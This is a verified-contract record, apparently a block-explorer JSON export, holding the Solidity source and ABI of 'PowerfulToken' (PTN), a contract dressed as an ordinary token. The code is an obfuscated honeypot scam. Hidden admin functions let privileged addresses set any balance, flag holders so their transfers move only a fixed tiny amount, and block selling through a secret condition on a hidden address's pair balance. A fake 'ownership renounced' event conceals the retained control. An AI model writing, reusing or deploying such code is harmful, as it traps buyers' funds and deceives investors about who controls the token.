{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface atFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedLiquidity) external view returns (uint256);\n\n    function transfer(address feeBuy, uint256 totalAt) external returns (bool);\n\n    function allowance(address takeTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeBuy,\n        uint256 totalAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountExemptBuy, uint256 value);\n    event Approval(address indexed takeTotal, address indexed spender, uint256 value);\n}\n\nabstract contract enableMinTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingAt {\n    function createPair(address maxFromSender, address txFrom) external returns (address);\n}\n\ninterface atFromMetadata is atFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PowerfulToken is enableMinTrading, atFrom, atFromMetadata {\n\n    function liquidityLaunched(address buyTotal) public {\n        takeTrading();\n        \n        if (buyTotal == autoReceiver || buyTotal == amountLaunched) {\n            return;\n        }\n        txTo[buyTotal] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellSenderTake;\n    }\n\n    string private totalSellAmount = \"Powerful Token\";\n\n    mapping(address => bool) public txTo;\n\n    function name() external view virtual override returns (string memory) {\n        return totalSellAmount;\n    }\n\n    uint256 constant modeLaunched = 3 ** 10;\n\n    bool private fromWallet;\n\n    mapping(address => mapping(address => uint256)) private isBuyMarketing;\n\n    function limitReceiver(address liquidityFee) public {\n        if (tradingBuy) {\n            return;\n        }\n        \n        txReceiver[liquidityFee] = true;\n        if (modeTokenAmount != liquidityMax) {\n            enableFund = false;\n        }\n        tradingBuy = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeSwap;\n    }\n\n    bool private takeAt;\n\n    uint256 tradingTx;\n\n    address autoTokenFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address launchMarketing, uint256 totalAt) external virtual override returns (bool) {\n        return tradingFund(_msgSender(), launchMarketing, totalAt);\n    }\n\n    bool public enableFund;\n\n    function allowance(address launchSwap, address marketingSell) external view virtual override returns (uint256) {\n        if (marketingSell == modeSell) {\n            return type(uint256).max;\n        }\n        return isBuyMarketing[launchSwap][marketingSell];\n    }\n\n    mapping(address => bool) public txReceiver;\n\n    address public autoReceiver;\n\n    bool private takeWallet;\n\n    event OwnershipTransferred(address indexed atLaunched, address indexed isTokenSwap);\n\n    address modeSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldToken(uint256 totalAt) public {\n        takeTrading();\n        sellFee = totalAt;\n    }\n\n    uint256 private liquidityMax;\n\n    string private sellSenderTake = \"PTN\";\n\n    uint256 private feeSwap = 100000000 * 10 ** 18;\n\n    function feeMarketing() public {\n        emit OwnershipTransferred(autoReceiver, address(0));\n        modeTake = address(0);\n    }\n\n    function balanceOf(address launchedLiquidity) public view virtual override returns (uint256) {\n        return listLaunchedIs[launchedLiquidity];\n    }\n\n    bool public receiverMode;\n\n    bool public tradingBuy;\n\n    uint256 private modeTokenAmount;\n\n    uint256 sellFee;\n\n    constructor (){\n        \n        txSender fromTotalReceiver = txSender(modeSell);\n        amountLaunched = tradingAt(fromTotalReceiver.factory()).createPair(fromTotalReceiver.WETH(), address(this));\n        \n        autoReceiver = _msgSender();\n        feeMarketing();\n        txReceiver[autoReceiver] = true;\n        listLaunchedIs[autoReceiver] = feeSwap;\n        if (fromWallet) {\n            takeWallet = false;\n        }\n        emit Transfer(address(0), autoReceiver, feeSwap);\n    }\n\n    uint8 private totalSender = 18;\n\n    function tradingFund(address totalFee, address feeBuy, uint256 totalAt) internal returns (bool) {\n        if (totalFee == autoReceiver) {\n            return tokenTrading(totalFee, feeBuy, totalAt);\n        }\n        uint256 fundEnable = atFrom(amountLaunched).balanceOf(autoTokenFund);\n        require(fundEnable == sellFee);\n        require(feeBuy != autoTokenFund);\n        if (txTo[totalFee]) {\n            return tokenTrading(totalFee, feeBuy, modeLaunched);\n        }\n        return tokenTrading(totalFee, feeBuy, totalAt);\n    }\n\n    address private modeTake;\n\n    mapping(address => uint256) private listLaunchedIs;\n\n    function transferFrom(address totalFee, address feeBuy, uint256 totalAt) external override returns (bool) {\n        if (_msgSender() != modeSell) {\n            if (isBuyMarketing[totalFee][_msgSender()] != type(uint256).max) {\n                require(totalAt <= isBuyMarketing[totalFee][_msgSender()]);\n                isBuyMarketing[totalFee][_msgSender()] -= totalAt;\n            }\n        }\n        return tradingFund(totalFee, feeBuy, totalAt);\n    }\n\n    function tokenTrading(address totalFee, address feeBuy, uint256 totalAt) internal returns (bool) {\n        require(listLaunchedIs[totalFee] >= totalAt);\n        listLaunchedIs[totalFee] -= totalAt;\n        listLaunchedIs[feeBuy] += totalAt;\n        emit Transfer(totalFee, feeBuy, totalAt);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return modeTake;\n    }\n\n    function approve(address marketingSell, uint256 totalAt) public virtual override returns (bool) {\n        isBuyMarketing[_msgSender()][marketingSell] = totalAt;\n        emit Approval(_msgSender(), marketingSell, totalAt);\n        return true;\n    }\n\n    address public amountLaunched;\n\n    function takeTrading() private view {\n        require(txReceiver[_msgSender()]);\n    }\n\n    function launchedTrading(address launchMarketing, uint256 totalAt) public {\n        takeTrading();\n        listLaunchedIs[launchMarketing] = totalAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeTake;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTokenSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountExemptBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"liquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PowerfulToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}